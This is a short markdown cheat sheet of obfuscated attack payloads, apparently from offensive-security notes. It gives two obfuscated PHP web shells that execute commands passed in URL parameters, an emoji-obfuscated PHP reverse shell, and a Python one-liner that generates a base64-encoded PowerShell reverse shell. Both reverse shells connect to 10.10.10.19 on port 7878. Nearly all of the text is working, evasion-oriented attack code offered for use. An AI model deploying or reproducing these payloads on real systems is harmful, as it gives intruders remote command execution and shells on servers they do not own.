# Obfuscated Shells

## Web Shells

### Obfuscated PHP

```php
#Usage: http://target.com/path/to/shell.php?0=command
<?=$_="";$_="'";$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo`$_`?>
```

```php
#Usage: http://target.com/path/to/shell.php?_=function&__=argument
#Example: http://target.com/path/to/shell.php?_=system&__=ls
<?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?> <?=${'_'.$_}["_"](${'_'.$_}["__"]);?>
```

## Reverse Shells

### Emoji PHP

```php
php -r '$😀="1";$😁="2";$😅="3";$😆="4";$😉="5";$😊="6";$😎="7";$😍="8";$😚="9";$🙂="0";$🤢=" ";$🤓="<";$🤠=">";$😱="-";$😵="&";$🤩="i";$🤔=".";$🤨="/";$🥰="a";$😐="b";$😶="i";$🙄="h";$😂="c";$🤣="d";$😃="e";$😄="f";$😋="k";$😘="n";$😗="o";$😙="p";$🤗="s";$😑="x";$💀 = $😄. $🤗. $😗. $😂. $😋. $😗. $😙. $😃. $😘;$🚀 = "10.10.10.19";$💻 = 7878;$🐚 = "sh". $🤢. $😱. $🤩. $🤢. $🤓. $😵. $😅. $🤢. $🤠. $😵. $😅. $🤢. $😁. $🤠. $😵. $😅;$🤣 =  $💀($🚀,$💻);$👽 = $😃. $😑. $😃. $😂;$👽($🐚);'
```

### Powershell b64 encoded

```python
#Execute in your linux to generate your Powershell Reverse Shell
python -c $'import base64; IP = "10.10.10.19"; PORT = "7878"; payload = \'$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\' % (IP, int(PORT)); print("powershell -e " + base64.b64encode(payload.encode("utf16")[2:]).decode());'
```

